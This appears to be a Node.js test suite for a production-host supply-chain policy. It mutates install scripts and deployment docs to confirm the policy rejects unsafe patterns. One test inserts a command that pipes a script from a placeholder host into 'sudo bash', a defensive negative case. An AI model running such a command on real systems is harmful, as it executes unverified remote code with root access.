import assert from "node:assert/strict";
import fs from "node:fs";
import test from "node:test";
import {
  assertProductionHostSupplyChain,
  productionHostSupplyChainFindings,
} from "./production-host-supply-chain-policy.mjs";

const sources = {
  baseInstaller: fs.readFileSync("scripts/ubuntu24-install-base.sh", "utf8"),
  pm2Deploy: fs.readFileSync("scripts/ubuntu24-deploy-pm2.sh", "utf8"),
  preflight: fs.readFileSync("scripts/ubuntu24-preflight.sh", "utf8"),
  deploymentDocs: [
    ["Ubuntu quick deployment guide", fs.readFileSync("DEPLOY_UBUNTU_24.md", "utf8")],
    [
      "Ubuntu production deployment guide",
      fs.readFileSync("DEPLOY_UBUNTU_24_PRODUCTION.md", "utf8"),
    ],
    ["Deployment entry point", fs.readFileSync("docs/Deployment.md", "utf8")],
  ],
};

test("governed host scripts retire mutable installers and keep verification fail closed", () => {
  assert.doesNotThrow(() => assertProductionHostSupplyChain(sources));
});

test("policy rejects remote root shell execution", () => {
  const mutated = {
    ...sources,
    baseInstaller: sources.baseInstaller.replace(
      'exit "$HOST_DEPLOYMENT_RETIRED"',
      "curl -fsSL https://example.invalid/setup.sh | sudo -E bash",
    ),
  };
  assert.match(productionHostSupplyChainFindings(mutated).join("\n"), /remote content into a shell/);
});

test("policy rejects mutable global process-manager installation", () => {
  const mutated = {
    ...sources,
    pm2Deploy: sources.pm2Deploy.replace(
      'exit "$HOST_DEPLOYMENT_RETIRED"',
      "sudo npm install -g pm2",
    ),
  };
  assert.match(productionHostSupplyChainFindings(mutated).join("\n"), /mutable global npm tooling/);
});

test("policy rejects non-lockfile production installation", () => {
  const mutated = {
    ...sources,
    preflight: sources.preflight.replace("npm ci --no-audit --no-fund", "npm install"),
  };
  const findings = productionHostSupplyChainFindings(mutated).join("\n");
  assert.match(findings, /exact lockfile/);
  assert.match(findings, /bypass the lockfile/);
});

test("policy rejects swallowed readiness failures", () => {
  const mutated = {
    ...sources,
    preflight: sources.preflight.replace(
      "curl --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/api/health > /dev/null",
      "node -e \"fetch('http://127.0.0.1:3000/api/health').catch(()=>process.exit(0))\" || true",
    ),
  };
  const findings = productionHostSupplyChainFindings(mutated).join("\n");
  assert.match(findings, /unhealthy runtime/);
  assert.match(findings, /swallow readiness failure/);
});

test("policy rejects revival of mutable deployment documentation", () => {
  const mutated = {
    ...sources,
    deploymentDocs: [
      ...sources.deploymentDocs,
      [
        "Injected legacy guide",
        [
          "TECPEY_IMAGE_DIGEST",
          "docker compose -f docker-compose.production.yml up -d --build",
          "curl --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/api/health",
          "sudo npm install -g pm2",
          "pm2 start ecosystem.config.cjs",
        ].join("\n"),
      ],
    ],
  };
  const findings = productionHostSupplyChainFindings(mutated).join("\n");
  assert.match(findings, /mutable global npm tooling/);
  assert.match(findings, /retired PM2 release path/);
  assert.match(findings, /mutable production image/);
  assert.match(findings, /mutable live-source deployment/);
});
